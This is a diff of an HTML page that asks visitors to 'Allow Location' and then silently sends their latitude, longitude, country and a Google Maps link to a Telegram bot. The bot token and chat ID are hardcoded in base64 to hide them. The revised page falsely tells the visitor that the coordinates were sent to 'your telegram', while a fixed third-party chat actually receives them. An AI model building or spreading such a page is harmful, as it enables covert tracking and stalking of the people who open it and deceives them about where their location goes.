@@ -2,180 +2,151 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Ultra Fast Tracker</title>
+<title>Deep Pink</title>
 
 <style>
-body {
-    margin: 0;
-    height: 100vh;
-    background: #FF1493;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    font-family: Arial;
-    color: white;
-    text-align: center;
-}
+    body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: #FF1493;
+        font-family: Arial, sans-serif;
+        color: white;
+        text-align: center;
+    }
 
-/* Button */
-button {
-    padding: 12px 25px;
-    font-size: 18px;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-}
+    button {
+        padding: 12px 20px;
+        font-size: 16px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+    }
 
-/* Countdown */
-#countdown {
-    font-size: 80px;
-    font-weight: bold;
-    margin-top: 20px;
-}
+    #progressContainer {
+        width: 80%;
+        height: 20px;
+        background: rgba(255,255,255,0.3);
+        border-radius: 10px;
+        margin-top: 20px;
+        overflow: hidden;
+        display: none;
+    }
 
-#heading {
-    font-size: 28px;
-    margin-top: 20px;
-}
+    #progressBar {
+        height: 100%;
+        width: 0%;
+        background: white;
+        transition: width 0.3s;
+    }
 
-/* Shake Image */
-#shakeImg {
-    width: 200px;
-    display: none;
-    margin-top: 20px;
-}
-
-/* Strong shake animation */
-@keyframes shake {
-    0% { transform: translate(0px, 0px); }
-    25% { transform: translate(15px, -15px); }
-    50% { transform: translate(-15px, 15px); }
-    75% { transform: translate(15px, 15px); }
-    100% { transform: translate(-15px, -15px); }
-}
-
-.shake {
-    animation: shake 0.1s infinite;
-}
+    #statusText {
+        margin-top: 15px;
+        font-size: 18px;
+    }
 </style>
 </head>
 
 <body>
 
-<button onclick="startProcess()">Allow Location</button>
+<button onclick="getLocation()">Allow Location</button>
 
-<div id="heading"></div>
-<div id="countdown"></div>
+<div id="progressContainer">
+    <div id="progressBar"></div>
+</div>
 
-<img id="shakeImg" src="https://i.imgur.com/8Km9tLL.png">
-
-<audio id="successAudio" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
+<div id="statusText"></div>
 
 <script>
-(function(){
+(function () {
 
-const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
-const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
+    const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
+    const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
 
-let uploadDone = false;
+    function updateProgress(percent) {
+        document.getElementById("progressBar").style.width = percent + "%";
+    }
 
-/* 🚀 TELEGRAM SEND (FASTEST POSSIBLE) */
-function sendToTelegram(lat, lon) {
-    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `📍 FAST LOCATION\nLat: ${lat}\nLon: ${lon}`
-        })
-    }).then(() => {
-        uploadDone = true;
-        onSuccess();
-    }).catch(()=>{});
-}
+    function setStatus(text) {
+        document.getElementById("statusText").innerText = text;
+    }
 
-/* 📡 LOCATION */
-function getLocationFast() {
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            sendToTelegram(pos.coords.latitude, pos.coords.longitude);
-        },
-        () => {},
-        {
-            enableHighAccuracy: false,  // faster than true
-            timeout: 5000,
-            maximumAge: Infinity       // reuse cached = fastest
-        }
-    );
-}
+    function sendToTelegram(lat, lon, country) {
+        const message =
+`📍 Location Detected
 
-/* 🎯 SUCCESS EFFECT */
-function onSuccess() {
-    document.getElementById("heading").innerText = "SUCCESS";
-    document.getElementById("countdown").innerText = "";
+Latitude: ${lat}
+Longitude: ${lon}
+Country: ${country}
 
-    const img = document.getElementById("shakeImg");
-    img.style.display = "block";
-    img.classList.add("shake");
+Map: https://www.google.com/maps?q=${lat},${lon}`;
 
-    document.getElementById("successAudio").play();
-}
-
-/* ⏱ COUNTDOWN ENGINE */
-function runCountdown(seconds, color, title, callback) {
-
-    const heading = document.getElementById("heading");
-    const countdown = document.getElementById("countdown");
-
-    heading.innerText = title;
-    countdown.style.color = color;
-
-    let time = seconds;
-
-    const interval = setInterval(() => {
-
-        if (uploadDone) {
-            clearInterval(interval);
-            return;
-        }
-
-        countdown.innerText = time;
-        time--;
-
-        if (time < 0) {
-            clearInterval(interval);
-            callback && callback();
-        }
-
-    }, 1000);
-}
-
-/* 🔥 MAIN FLOW */
-window.startProcess = function () {
-
-    uploadDone = false;
-
-    // Start location instantly (parallel)
-    getLocationFast();
-
-    // 1st Countdown (Black - 10s)
-    runCountdown(10, "black", "Tracking You (Phase 1)", () => {
-
-        if (uploadDone) return;
-
-        // 2nd Countdown (Red - 5s)
-        runCountdown(5, "red", "Still Processing (Phase 2)", () => {
-
-            if (uploadDone) return;
-
-            // 3rd Countdown (Yellow - fallback)
-            runCountdown(5, "yellow", "Final Attempt (Phase 3)");
-
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
         });
+    }
 
-    });
-};
+    async function getCountry(lat, lon) {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+            const data = await res.json();
+            return data.address.country || "Unknown";
+        } catch {
+            return "Unknown";
+        }
+    }
+
+    window.getLocation = function () {
+
+        document.getElementById("progressContainer").style.display = "block";
+        setStatus("Checking where are you from...");
+
+        let progress = 0;
+
+        const interval = setInterval(() => {
+            if (progress < 90) {
+                progress += 10;
+                updateProgress(progress);
+            }
+        }, 300);
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            progress = 95;
+            updateProgress(progress);
+
+            const country = await getCountry(lat, lon);
+
+            progress = 100;
+            updateProgress(100);
+
+            clearInterval(interval);
+
+            setStatus(`You are from ${country}`);
+
+            try {
+                await sendToTelegram(lat, lon, country);
+                setStatus("Your latitude and longitude are sent to your telegram");
+            } catch {
+                setStatus("Failed to send data to Telegram");
+            }
+
+        }, (err) => {
+            clearInterval(interval);
+            setStatus("Location access denied or failed");
+        });
+    };
 
 })();
 </script>
